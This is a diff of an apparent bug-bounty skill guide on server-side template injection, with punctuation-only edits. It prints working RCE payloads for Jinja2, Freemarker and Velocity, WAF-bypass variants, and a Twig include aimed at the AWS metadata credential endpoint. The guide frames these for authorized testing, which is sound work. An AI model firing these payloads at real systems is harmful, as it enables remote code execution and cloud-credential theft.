@@ -47,7 +47,7 @@ do not access cloud metadata credentials or other users' data to prove impact.
 
 ---
 
-## 14. SSTI — SERVER-SIDE TEMPLATE INJECTION
+## 14. SSTI: SERVER-SIDE TEMPLATE INJECTION
 > Easy to detect, high payout ($2K–$8K). Direct path to RCE.
 
 ### Detection Payloads (try all)
@@ -77,13 +77,13 @@ ${7*7}           → 49 = Freemarker / Velocity / Mako (all use ${...})
 ```
 
 ### Length-constrained injection fields (profile name, display name, subject)
-When the injectable field caps input length (a profile-name / display-name field is often ≤30-64 chars), the full `os.popen` one-liner won't fit — but detection and class-enumeration still do. Confirm with the short probe, then enumerate the gadget index in stages instead of one payload:
+When the injectable field caps input length (a profile-name / display-name field is often ≤30-64 chars), the full `os.popen` one-liner won't fit; but detection and class-enumeration still do. Confirm with the short probe, then enumerate the gadget index in stages instead of one payload:
 ```python
 {{ '7'*7 }}                                  # detection, fits anywhere
 {{ [].__class__.__base__.__subclasses__() }} # dump class list, pick the index for subprocess.Popen/os
 {{ ''.__class__.__mro__[1].__subclasses__()[INDEX] ('id',shell=True,stdout=-1).communicate() }}
 ```
-The reflected sink is frequently an **outbound email** (the account-update / confirmation mail rendering your name), not the web page — read the email body for the evaluated output. Disclosed: reports/125980 (profile-name → Jinja2 → confirmation email, length-limited).
+The reflected sink is frequently an **outbound email** (the account-update / confirmation mail rendering your name), not the web page; read the email body for the evaluated output. Disclosed: reports/125980 (profile-name → Jinja2 → confirmation email, length-limited).
 
 ### Where to Test
 ```
@@ -96,7 +96,7 @@ URL path parameters, search queries reflected in results, HTTP headers reflected
 Some SSTI lives behind a logged-in template editor (CMS "edit template" / product-template / email-template
 preview). PortSwigger's *"SSTI using documentation"* class is this shape. Three things break a naive attempt:
 
-1. **Fingerprint BEFORE firing RCE — the engine decides the syntax.** Do NOT assume Jinja2. Probe the
+1. **Fingerprint BEFORE firing RCE; the engine decides the syntax.** Do NOT assume Jinja2. Probe the
    whole matrix and read which one evaluates:
    ```
    ${7*7}  → 49  AND  #{7*7} → 49   ⇒ Freemarker (Java)   ← {{7*7}} does NOTHING here
@@ -104,7 +104,7 @@ preview). PortSwigger's *"SSTI using documentation"* class is this shape. Three 
    <%= 7*7 %> → 49                   ⇒ ERB (Ruby)
    *{7*7}  → 49                      ⇒ Thymeleaf (Spring)
    ```
-   If `{{7*7}}` renders literally but `${7*7}`→49, you are on **Freemarker** — stop sending `{{config...}}`.
+   If `{{7*7}}` renders literally but `${7*7}`→49, you are on **Freemarker**; stop sending `{{config...}}`.
 
 2. **The record id is usually a QUERY param, not a body field.** The editor form posts back to
    `POST /…/template?productId=N` with the id in the URL. The BODY carries only
@@ -117,7 +117,7 @@ preview). PortSwigger's *"SSTI using documentation"* class is this shape. Three 
    loop). Switch to `template-action=save` only once the payload is right, then trigger the render
    (load the public page that uses the template) to fire the command.
 
-   **Freemarker documentation RCE** (the documented `Execute` utility — this IS the intended technique):
+   **Freemarker documentation RCE** (the documented `Execute` utility; this IS the intended technique):
    ```
    <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
    ```
@@ -127,17 +127,17 @@ preview). PortSwigger's *"SSTI using documentation"* class is this shape. Three 
 
 ## Related Skills & Chains
 
-- **`hunt-rce`** — SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → unauthenticated RCE as the rendering worker. Escalate only when that effect is explicitly authorized and needed for the agreed evidence.
-- **`hunt-xss`** — When the template engine sandboxes the runtime (or you only get the rendered output back as HTML), the same `{{7*7}}` reflection often still yields stored XSS. Chain primitive: sandboxed Jinja2 SSTI without escapes → inject `<script>` into rendered email template → stored XSS hitting every recipient who views the message.
-- **`hunt-ssrf`** — Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
-- **`hunt-file-upload`** — Office docs, SVGs, and email templates uploaded by the user are common SSTI surfaces (the server re-renders them). Chain primitive: upload a DOCX whose `word/document.xml` contains `${T(java.lang.Runtime).getRuntime().exec("id")}` to a Velocity/Freemarker-driven mail-merge → RCE.
-- **`security-arsenal`** — Reach for the engine-specific escape payload tree: Jinja2 class-walker variants (`__subclasses__()[N]` index hunting), Twig `_self.env` registerUndefinedFilterCallback, Freemarker `?new()` Execute, ERB backticks, Velocity `$class.inspect`, Smarty `{php}...{/php}`, plus the WAF-bypass variants (`{{request|attr('application')|...}}`, Unicode escapes, `{%print(...)%}`).
-- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical RCE. A `{{7*7}} → 49` reflection inside a sandboxed engine (e.g., Twig sandbox mode, Jinja2 SandboxedEnvironment with no escape) is Medium SSTI, not Critical RCE. Prove `id`/OOB DNS callback with a unique marker before writing the report.
+- **`hunt-rce`**; SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → unauthenticated RCE as the rendering worker. Escalate only when that effect is explicitly authorized and needed for the agreed evidence.
+- **`hunt-xss`**; When the template engine sandboxes the runtime (or you only get the rendered output back as HTML), the same `{{7*7}}` reflection often still yields stored XSS. Chain primitive: sandboxed Jinja2 SSTI without escapes → inject `<script>` into rendered email template → stored XSS hitting every recipient who views the message.
+- **`hunt-ssrf`**; Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
+- **`hunt-file-upload`**; Office docs, SVGs, and email templates uploaded by the user are common SSTI surfaces (the server re-renders them). Chain primitive: upload a DOCX whose `word/document.xml` contains `${T(java.lang.Runtime).getRuntime().exec("id")}` to a Velocity/Freemarker-driven mail-merge → RCE.
+- **`security-arsenal`**; Reach for the engine-specific escape payload tree: Jinja2 class-walker variants (`__subclasses__()[N]` index hunting), Twig `_self.env` registerUndefinedFilterCallback, Freemarker `?new()` Execute, ERB backticks, Velocity `$class.inspect`, Smarty `{php}...{/php}`, plus the WAF-bypass variants (`{{request|attr('application')|...}}`, Unicode escapes, `{%print(...)%}`).
+- **`triage-validation`**; Apply the Pre-Severity Gate before claiming Critical RCE. A `{{7*7}} → 49` reflection inside a sandboxed engine (e.g., Twig sandbox mode, Jinja2 SandboxedEnvironment with no escape) is Medium SSTI, not Critical RCE. Prove `id`/OOB DNS callback with a unique marker before writing the report.
 
 ## When to Use
 
 - You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
-- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.
+- You need the recon, exploitation, or validation workflow described below; executed strictly inside the approved scope.
 
 ## Limitations
 
